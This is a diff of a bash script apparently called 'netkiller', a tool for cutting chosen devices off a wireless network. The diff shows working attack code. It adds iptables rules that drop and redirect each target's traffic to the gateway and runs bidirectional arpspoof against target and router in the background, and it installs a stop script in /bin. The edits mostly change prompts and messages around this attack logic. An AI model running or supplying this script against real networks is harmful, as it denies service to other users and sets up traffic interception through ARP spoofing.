@@ -23,13 +23,13 @@ echo "DEVICE IP: | $IP"
 echo ""
 
 # Detect Interface
-echo "Enter Wireless Interface: Enter for default"
+echo "Enter Wireless Interface: Skip for default"
 read -p "> $WLAN " WLN
 INTERFACE="${WLN:-$WLAN}"
 echo ""
 
 # Detect Gateway IP
-echo "Enter Router Gateway IP: Enter for default"
+echo "Enter Router Gateway IP: Skip for default"
 read -p "> $GW " INET
 GATEWAY="${INET:-$GW}"
 echo ""
@@ -47,10 +47,7 @@ TARGET_IPS=$(echo "$IPS" | tr ',' ' ')
 echo ""
 
 # Detect Device IP
-echo "Enter Device IP: Enter for default"
-read -p "> $IP " DEVIP
-MYIP="${DEVIP:-$IP}"
-echo ""
+MYIP="$IP"
 
 # Prompt configuration
 echo "Your Target Configuration..."
@@ -73,7 +70,7 @@ cat > /bin/netkiller-stop << EOF
 #!/bin/sh
 iptables -t nat -F
 iptables -F FORWARD
-pkill arpspoof
+pkill -f arpspoof
 echo "Restoring the Connections..."
 EOF
 chmod 755 /bin/netkiller-stop
@@ -87,11 +84,10 @@ for TARGET in $TARGET_IPS; do
     fi
 
     # Block all traffic of the target wifi clients
-    (
         iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
         iptables -I FORWARD -d "$GATEWAY" -s "$TARGET" -j DROP
         iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-
+    (
         # Bidirectional ARP Spoofing
         arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
         arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
@@ -99,6 +95,7 @@ for TARGET in $TARGET_IPS; do
 done
 
 echo " "
-echo "Attack is running in the background...!!!"
+echo "Netkiller Attack is running in the background...!!!"
+echo ""
 echo "To stop, run: sudo netkiller-stop"
 echo " "
